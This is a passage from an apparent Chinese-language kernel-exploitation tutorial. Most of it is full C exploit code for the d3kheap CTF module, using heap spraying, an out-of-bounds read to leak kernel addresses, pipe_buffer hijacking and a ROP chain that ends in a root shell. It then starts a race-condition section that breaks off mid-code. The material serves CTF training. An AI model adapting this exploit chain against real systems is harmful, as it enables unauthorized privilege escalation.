0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NR 0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NR 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG 0xDEADBEEF</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 0x80</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MASTER_MSG_SZ 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MASTER_MSG_TYPE 0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVANT_MSG_SZ 0x400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVANT_MSG_TYPE 0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE 0xC0DE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALLOC_FLAG 0x1234</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FREE_FLAG 0xDEAD</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82c6d580</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RSI_POP_RSP_POP4_RET 0xffffffff812dbede</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETRUN_TO_USERMODE 0xffffffff81c00ff0</span><br><br><span class="hljs-type">char</span> fake_servant_msg[<span class="hljs-number">704</span>];  <span class="hljs-comment">/* sk_buff need include a tail, so the size(1024 - 320) should be set for the buff */</span><br><span class="hljs-type">int</span> dev_fd;                 <span class="hljs-comment">/* using by filesystem */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>&#123;</span><br>    <span class="hljs-type">void</span>* m_next;<br>    <span class="hljs-type">void</span>* m_prev;<br>    <span class="hljs-type">long</span> m_type;<br>    <span class="hljs-type">size_t</span> m_ts;<br>    <span class="hljs-type">size_t</span> next;<br>    <span class="hljs-type">size_t</span> security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span>&#123;</span><br>    <span class="hljs-type">size_t</span> *next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SERVANT_MSG_SZ - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;servant_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[MASTER_MSG_SZ - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;master_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x2000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125;oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-type">size_t</span> page;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">size_t</span> ops;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>&#123;</span><br>    <span class="hljs-type">size_t</span> confirm;<br>    <span class="hljs-type">size_t</span> release;<br>    <span class="hljs-type">size_t</span> try_steal;<br>    <span class="hljs-type">size_t</span> get;<br>&#125;;<br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * save the process current context</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;</span>);<br>&#125;<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">get_msg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf *)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">copy_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">alloc</span><span class="hljs-params">()</span>&#123;<br>    ioctl(dev_fd, ALLOC_FLAG, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    ioctl(dev_fd, FREE_FLAG, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_skb</span><span class="hljs-params">(<span class="hljs-type">int</span> skb_queue[SK_QUEUE_NR][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buffer, <span class="hljs-type">size_t</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SK_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NR; j++)&#123;<br>            <span class="hljs-keyword">if</span>(write(skb_queue[i][<span class="hljs-number">0</span>], buffer, size) &lt; <span class="hljs-number">0</span>)&#123;<br>                error_log(<span class="hljs-string">&quot;Spraying sk_buff failed!&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">free_skb</span><span class="hljs-params">(<span class="hljs-type">int</span> skb_queue[SK_QUEUE_NR][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buffer, <span class="hljs-type">size_t</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i= <span class="hljs-number">0</span>; i &lt; SK_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NR; j++)&#123;<br>            <span class="hljs-keyword">if</span>(read(skb_queue[i][<span class="hljs-number">1</span>], buffer, size) &lt; <span class="hljs-number">0</span>)&#123;<br>                error_log(<span class="hljs-string">&quot;Free sk_buff failed!&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build_msg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg* builded_msg, <span class="hljs-type">void</span>* m_next, <span class="hljs-type">void</span>* m_prev, <span class="hljs-type">long</span> mtype, <span class="hljs-type">size_t</span> m_ts, <span class="hljs-type">size_t</span> next)</span>&#123;<br>    builded_msg-&gt;m_next = m_next;<br>    builded_msg-&gt;m_prev = m_prev;<br>    builded_msg-&gt;m_type = mtype;<br>    builded_msg-&gt;m_ts = m_ts;<br>    builded_msg-&gt;next = next;<br>    builded_msg-&gt;security = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_rootshell</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())&#123;<br>        error_log(<span class="hljs-string">&quot;Priviledge elevation failed!&quot;</span>);<br>    &#125;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> skb_queue[SK_QUEUE_NR][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> msg_queue[MSG_QUEUE_NR];    <br>    <span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> victim_qidx = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">size_t</span> victim_addr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> <span class="hljs-title">nearby_msg</span>, <span class="hljs-title">nearby_master_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buffer_ptr</span>;</span><br>    <span class="hljs-type">size_t</span> *ROPchain;<br>    <span class="hljs-type">size_t</span> ropchain_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br><br>    <span class="hljs-type">size_t</span> kernel_base, page_offset_base, kernel_offset, guess_page_offset;<br><br>    info_log(<span class="hljs-string">&quot;Step I:Preserve the process context and bind one core... &quot;</span>);<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    saveStatus();<br>    <br>    info_log(<span class="hljs-string">&quot;Step II:Spray the sk_queue and msg_queue...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SK_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, skb_queue[i]) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the socket_queue failed!&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>((msg_queue[i] = get_msg()) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the msg_queue failed!&quot;</span>);<br>        &#125;<br>    &#125;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);<br>    alloc();<br><br>    info_log(<span class="hljs-string">&quot;Step III:Construct the UAF...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(&amp;master_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(master_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;servant_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(servant_msg));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++)&#123;<br>        <span class="hljs-comment">/* Allocate the master msg_msg */</span><br>        *(<span class="hljs-type">int</span> *)&amp;master_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;master_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span>(send_msg(msg_queue[i], &amp;master_msg, <span class="hljs-keyword">sizeof</span>(master_msg), MASTER_MSG_TYPE) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the master msg_msg failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">/* Allocate the servant msg_msg */</span><br>        *(<span class="hljs-type">int</span> *)&amp;servant_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;servant_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span>(send_msg(msg_queue[i], &amp;servant_msg, <span class="hljs-keyword">sizeof</span>(servant_msg), SERVANT_MSG_TYPE) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the servant msg_msg failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">/* First free the d3kheap object */</span><br>        <span class="hljs-keyword">if</span>(i == <span class="hljs-number">1024</span>)<br>           delete();<br>    &#125;<br><br>    info_log(<span class="hljs-string">&quot;Step IV:Search for the UAF msg_msg...&quot;</span>);<br>    <span class="hljs-comment">/* Second free the d3kheap object */</span><br>    delete();<br>    build_msg((<span class="hljs-keyword">struct</span> msg_msg *)fake_servant_msg, (<span class="hljs-type">void</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, (<span class="hljs-type">void</span>*)<span class="hljs-string">&quot;peiwithhao&quot;</span>, *(<span class="hljs-type">long</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, SERVANT_MSG_SZ, <span class="hljs-number">0</span>);<br>    spray_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(copy_msg(msg_queue[i], &amp;servant_msg, <span class="hljs-keyword">sizeof</span>(servant_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>            victim_qidx = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(victim_qidx == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;You have not found the victim msg_msg queue idx:(...&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]the victim msg_msg idx is :%d\n&quot;</span>, victim_qidx);<br>    free_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br><br>    info_log(<span class="hljs-string">&quot;Step V:Overread the victim msg_msg&#x27;s nearby servant msg_msg&quot;</span>);<br>    build_msg((<span class="hljs-keyword">struct</span> msg_msg *)fake_servant_msg, (<span class="hljs-type">void</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, (<span class="hljs-type">void</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>);<br>    spray_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    <span class="hljs-comment">/* We could oob read the next nearby servant msg_msg */</span><br>    <span class="hljs-keyword">if</span>(copy_msg(msg_queue[victim_qidx], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;OOB read failed!&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * check the memory</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">    for(int i = 0; i &lt; 0x10; i++)&#123;</span><br><span class="hljs-comment">        printf(&quot;[--- memory dump ---](%2d)0x%x\n&quot;, i, *(int *)&amp;oob_msg.mtext[0x400 + i*4]);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x400</span>] != MSG_TAG)&#123;<br>        error_log(<span class="hljs-string">&quot;Unfortunatally! The nearby object had already been occupied!&quot;</span>);<br>    &#125;<br>    nearby_msg = *(<span class="hljs-keyword">struct</span> msg_msg*)&amp;oob_msg.mtext[SERVANT_MSG_SZ - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    guess_page_offset = (<span class="hljs-type">size_t</span>)(nearby_msg.m_next)&amp;(<span class="hljs-number">0xfffffffff0000000</span>);<br>    PRINT_ADDR(<span class="hljs-string">&quot;guess page_offset_base&quot;</span>, guess_page_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Find the victim msg_msg addr</span><br><span class="hljs-comment">     * */</span><br>    info_log(<span class="hljs-string">&quot;Step VI:Get the victim msg_msg addr through nearby servant msg_msg...&quot;</span>);<br>    free_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    build_msg((<span class="hljs-keyword">struct</span> msg_msg *)fake_servant_msg, (<span class="hljs-type">void</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, (<span class="hljs-type">void</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), (<span class="hljs-type">size_t</span>)(nearby_msg.m_prev) - <span class="hljs-number">8</span>);<br>    spray_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    <span class="hljs-keyword">if</span>(copy_msg(msg_queue[victim_qidx], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Cannot find the nearby master msg_msg...&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)&#123;<br>        error_log(<span class="hljs-string">&quot;Unfortunatally! The nearby object had already been occupied!&quot;</span>);<br>    &#125;<br>    nearby_master_msg = *(<span class="hljs-keyword">struct</span> msg_msg*)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    PRINT_ADDR(<span class="hljs-string">&quot;nearby msg_msg addr&quot;</span>, (<span class="hljs-type">size_t</span>)nearby_master_msg.m_next);<br>    victim_addr = (<span class="hljs-type">size_t</span>)nearby_master_msg.m_next - <span class="hljs-number">0x400</span>; <br>    PRINT_ADDR(<span class="hljs-string">&quot;victim_addr&quot;</span>, victim_addr);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Construct the UAF sk_buff</span><br><span class="hljs-comment">     * */</span><br>    info_log(<span class="hljs-string">&quot;Step VII:Fix the msg_msg and free it, so we get the uaf sk_buff...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(&amp;fake_servant_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    free_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    build_msg((<span class="hljs-keyword">struct</span> msg_msg*)fake_servant_msg, (<span class="hljs-type">void</span> *)victim_addr + <span class="hljs-number">0x800</span> , (<span class="hljs-type">void</span> *)victim_addr + <span class="hljs-number">0x800</span>, VICTIM_MSG_TYPE, SERVANT_MSG_TYPE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>);<br>    spray_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    <span class="hljs-keyword">if</span>(recv_msg(msg_queue[victim_qidx], &amp;servant_msg, <span class="hljs-keyword">sizeof</span>(servant_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;unlink the victim servant msg_msg failed!&quot;</span>);<br>    &#125;<br>    <br>    info_log(<span class="hljs-string">&quot;Step VIII:Make the pipe_buf with sk_buff in victim 1k object...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i ++)&#123;<br>        <span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the pipe failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">10</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Write to the pipe failed!&quot;</span>);<br>        &#125;<br>    &#125;<br>    pipe_buffer_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *)&amp;fake_servant_msg;    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i= <span class="hljs-number">0</span>; i &lt; SK_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NR; j++)&#123;<br>            <span class="hljs-keyword">if</span>(read(skb_queue[i][<span class="hljs-number">1</span>], &amp;fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg)) &lt; <span class="hljs-number">0</span>)&#123;<br>                error_log(<span class="hljs-string">&quot;Free sk_buff failed!&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(pipe_buffer_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)&#123;<br>                kernel_offset = pipe_buffer_ptr-&gt;ops - ANON_PIPE_BUF_OPS; <br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br>    PRINT_ADDR(<span class="hljs-string">&quot;kernel_base&quot;</span>, kernel_base);<br>    PRINT_ADDR(<span class="hljs-string">&quot;kernel_offset&quot;</span>, kernel_offset);<br>    <br>    info_log(<span class="hljs-string">&quot;Step IX:Hijack the pipe_buffer-&gt;ops-&gt;release...&quot;</span>);<br>    pipe_buffer_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *)&amp;fake_servant_msg;<br>    pipe_buffer_ptr-&gt;page = *(<span class="hljs-type">size_t</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>;<br>    pipe_buffer_ptr-&gt;ops = victim_addr + <span class="hljs-number">0x100</span>;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *)&amp;fake_servant_msg[<span class="hljs-number">0x100</span>];<br>    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP4_RET + kernel_offset;<br><br>    ROPchain = (<span class="hljs-type">size_t</span> *)&amp;fake_servant_msg[<span class="hljs-number">0x20</span>]; <br>    ropchain_idx = <span class="hljs-number">0</span>;<br>    ROPchain[ropchain_idx++] = POP_RDI_RET + kernel_offset;<br>    ROPchain[ropchain_idx++] = INIT_CRED + kernel_offset;<br>    ROPchain[ropchain_idx++] = COMMIT_CREDS + kernel_offset;<br>    ROPchain[ropchain_idx++] = SWAPGS_RESTORE_REGS_AND_RETRUN_TO_USERMODE + <span class="hljs-number">22</span> + kernel_offset;<br>    ROPchain[ropchain_idx++] = <span class="hljs-number">0xdeadbeef</span>;<br>    ROPchain[ropchain_idx++] = <span class="hljs-number">0xbeefdead</span>;<br>    ROPchain[ropchain_idx++] = (<span class="hljs-type">size_t</span>)get_rootshell;<br>    ROPchain[ropchain_idx++] = user_cs;<br>    ROPchain[ropchain_idx++] = user_rflags;<br>    ROPchain[ropchain_idx++] = user_sp + <span class="hljs-number">8</span>;<br>    ROPchain[ropchain_idx++] = user_ss;<br><br>    spray_skb(skb_queue, fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="四、Race-Condition条件竞争"><a href="#四、Race-Condition条件竞争" class="headerlink" title="四、Race Condition条件竞争"></a>四、Race Condition条件竞争</h1><p>大伙应该都听过这个名字，也就是利用了如今计算机领域常见的同步和互斥导致问题来进行攻击</p><h2 id="例题：0CTF2018-Final-baby-kernel"><a href="#例题：0CTF2018-Final-baby-kernel" class="headerlink" title="例题：0CTF2018 Final - baby kernel"></a>例题：0CTF2018 Final - baby kernel</h2><p>整个模块就实现了ioctl，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">baby_ioctl</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp-5Ch] [rbp-5Ch]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp-58h] [rbp-58h]</span><br><br>  _fentry__(a1, a2);<br>  v5 = v2;<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x6666</span> )<br>  &#123;<br>    printk(<span class="hljs-string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);<br>    <span 